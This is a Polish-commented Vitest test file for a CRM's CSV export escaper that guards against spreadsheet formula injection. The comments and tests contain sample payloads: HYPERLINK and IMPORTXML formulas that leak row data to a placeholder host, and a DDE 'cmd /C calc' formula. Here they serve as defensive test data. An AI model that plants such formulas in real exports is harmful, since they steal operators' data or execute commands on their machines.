// Bramka bezpieczeństwa eksportów CRM: wstrzyknięcie formuły do arkusza.
//
// PRZYCZYNA ŹRÓDŁOWA, KTÓRĄ TEN TEST ZAMYKA. Jedna reguła bezpieczeństwa stała
// w repo w TRZECH kopiach o trzech różnych poziomach ochrony:
//
//   * `crm.functions.ts` eksport listy leadów - neutralizował formuły;
//   * `crm.functions.ts` eksport kroniki leada - neutralizował formuły;
//   * `crm/companyViews.ts` eksport listy firm - NIE neutralizował.
//
// Trzecia kopia nie była gorsza przez niedbałość, tylko przez to, że powstała
// osobno i nikt nie miał gdzie sprawdzić, jak wygląda wzorzec. Po konsolidacji
// jest jedno miejsce - i to jest to miejsce, w którym stoi test.
//
// DLACZEGO TO JEST REALNE, A NIE TEORETYCZNE. Napastnik nie potrzebuje żadnego
// dostępu do panelu. Dane w tych eksportach są w całości dostarczone z zewnątrz:
// nazwa firmy wchodzi importem CSV i z formularzy, `detail` zdarzenia wchodzi
// z integracji partnerskiej. Wystarczy, że nazwa firmy brzmi
// `=HYPERLINK("https://zbieram.example/?d="&A1;"Faktura")` - operator, który
// wyeksportuje listę i otworzy ją w arkuszu, sam wysyła zawartość wiersza na
// cudzy serwer. Klasyczne CSV Injection (OWASP), z tą różnicą, że ładunek
// wchodzi tu ścieżką, którą platforma i tak musi przyjmować.
import { describe, expect, it } from "vitest";
import { csvCell, csvDocument, csvRow } from "../csv";

describe("csvCell - neutralizacja formuły", () => {
  // Pełny zestaw znaków, na których arkusz zaczyna interpretować komórkę jako
  // formułę. `-` jest w zestawie, bo `-1+1` też jest wyrażeniem, a nie tekstem.
  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "poprzedza apostrofem wartość zaczynającą się od %j",
    (lead) => {
      expect(csvCell(`${lead}CMD`)).toContain("'");
      expect(csvCell(`${lead}CMD`).startsWith("'") || csvCell(`${lead}CMD`).startsWith("\"'")).toBe(
        true,
      );
    },
  );

  it("neutralizuje realny ładunek wyciekający wiersz na cudzy serwer", () => {
    const payload = '=HYPERLINK("https://zbieram.example/?d="&A1;"Faktura")';
    const cell = csvCell(payload);
    // Apostrof musi stać PRZED znakiem formuły, wewnątrz cudzysłowów komórki.
    expect(cell).toBe(`"'=HYPERLINK(""https://zbieram.example/?d=""&A1;""Faktura"")"`);
    // Kanarek intencji: sam ładunek nadal jest w pliku (nie kasujemy danych
    // operatora), po prostu renderuje się literalnie.
    expect(cell).toContain("HYPERLINK");
  });

  it.each([
    "=cmd|' /C calc'!A0",
    "+1+1",
    "-1+1",
    "@SUM(1+9)",
    "=1+1",
    '=IMPORTXML(CONCAT("https://zbieram.example/?d=", A1), "//a")',
  ])("neutralizuje %j", (payload) => {
    const cell = csvCell(payload);
    const unquoted = cell.startsWith('"') ? cell.slice(1, -1) : cell;
    expect(unquoted.startsWith("'"), `${payload} weszło bez apostrofu`).toBe(true);
  });

  it("nie dokłada apostrofu tam, gdzie nie ma formuły", () => {
    for (const value of ["Instytut Analiz", "anna@example.eu", "0048221234567", "2026-08-14"]) {
      expect(csvCell(value), value).not.toContain("'");
    }
  });

  it("adres e-mail NIE jest formułą - `@` w środku nie liczy się", () => {
    // Ważne rozróżnienie: `@` na POCZĄTKU jest formułą, `@` w środku adresu nie.
    // Nadmiarowy apostrof przy każdym adresie zepsułby eksport, który operator
    // wkleja z powrotem do narzędzi mailingowych.
    expect(csvCell("anna@example.eu")).toBe("anna@example.eu");
  });
});

describe("csvCell - ucieczka z komórki", () => {
  it("cytuje i podwaja cudzysłów", () => {
    expect(csvCell('Instytut "Analiz"')).toBe('"Instytut ""Analiz"""');
  });

  it("cytuje przecinek", () => {
    expect(csvCell("Warszawa, Polska")).toBe('"Warszawa, Polska"');
  });

  it("cytuje średnik - polska lokalizacja Excela czyta CSV z tym separatorem", () => {
    // Bez cytowania wartość z średnikiem rozjeżdża wiersz w Excelu PL, mimo że
    // plik jest poprawny wobec RFC 4180 (gdzie separatorem jest przecinek).
    expect(csvCell("energetyka; regulacje")).toBe('"energetyka; regulacje"');
  });

  it.each([
    ["LF", "wiersz 1\nwiersz 2"],
    ["CRLF", "wiersz 1\r\nwiersz 2"],
  ])("cytuje znak nowej linii (%s)", (_label, value) => {
    expect(csvCell(value).startsWith('"')).toBe(true);
    expect(csvCell(value).endsWith('"')).toBe(true);
  });

  it("samotny CR jest jednocześnie znakiem formuły i końcem wiersza", () => {
    // Poprzedni escaper miał `\r` w zestawie formuł, ale NIE w zestawie znaków
    // wymagających cytowania (`/[",\n]/`) - więc `\r` w ŚRODKU wartości kończył
    // wiersz u większości parserów i rozsypywał plik. Dlatego oba zestawy.
    const cell = csvCell("Instytut\rAnaliz");
    expect(cell).toBe('"Instytut\rAnaliz"');
  });

  it("apostrof ochronny ląduje WEWNĄTRZ cudzysłowów, nie przed nimi", () => {
    // Kolejność operacji: najpierw apostrof, potem cytowanie. Odwrotnie
    // apostrof stałby poza komórką i sam nie byłby chroniony.
    expect(csvCell("=a,b")).toBe(`"'=a,b"`);
  });
});

describe("csvCell - kształty wartości z warstwy danych", () => {
  it("pustka i brak wartości dają pustą komórkę", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell("")).toBe("");
  });

  it("liczba i wartość logiczna renderują się bez cytowania", () => {
    expect(csvCell(42)).toBe("42");
    expect(csvCell(0)).toBe("0");
    expect(csvCell(true)).toBe("true");
    expect(csvCell(false)).toBe("false");
  });

  it("zero NIE jest traktowane jako brak wartości", () => {
    // Liczniki leadów i kontaktów bywają zerowe; `if (!v) return ""` zamieniłoby
    // rzetelne zero na puste pole i operator czytałby "nie wiem" zamiast "zero".
    expect(csvCell(0)).not.toBe("");
  });

  it("tablica (tagi leada) skleja się pionową kreską", () => {
    expect(csvCell(["energia", "regulacje"])).toBe("energia|regulacje");
  });

  it("każdy element tablicy przechodzi neutralizację po sklejeniu", () => {
    // Ładunek w PIERWSZYM elemencie jest ładunkiem całej komórki.
    expect(csvCell(["=CMD()", "energia"])).toBe("'=CMD()|energia");
  });

  it("obiekt (`meta` zdarzenia) idzie przez JSON, a wynik nadal jest neutralizowany", () => {
    expect(csvCell({ stage: "qualified" })).toBe('"{""stage"":""qualified""}"');
  });
});

describe("csvRow / csvDocument", () => {
  it("wiersz rozdziela komórki przecinkiem", () => {
    expect(csvRow(["a", 1, null])).toBe("a,1,");
  });

  it("dokument stawia nagłówek na początku", () => {
    const csv = csvDocument(["firma", "kraj"], [["Instytut", "Polska"]]);
    expect(csv).toBe("firma,kraj\nInstytut,Polska");
  });

  it("dokument bez wierszy to sam nagłówek - nie pusty plik", () => {
    // Operator, który wyeksportuje pustą listę, ma dostać plik z kolumnami,
    // a nie zero bajtów wyglądających jak awaria pobierania.
    expect(csvDocument(["firma"], [])).toBe("firma");
  });

  it("nagłówek też jest neutralizowany - etykiety kolumn są konfigurowalne", () => {
    expect(csvDocument(["=zle"], [])).toBe("'=zle");
  });

  it("liczba komórek w wierszu odpowiada liczbie kolumn nagłówka", () => {
    const csv = csvDocument(["a", "b", "c"], [["1", "2", "3"]]);
    const [header, row] = csv.split("\n");
    expect(header.split(",")).toHaveLength(3);
    expect(row.split(",")).toHaveLength(3);
  });
});
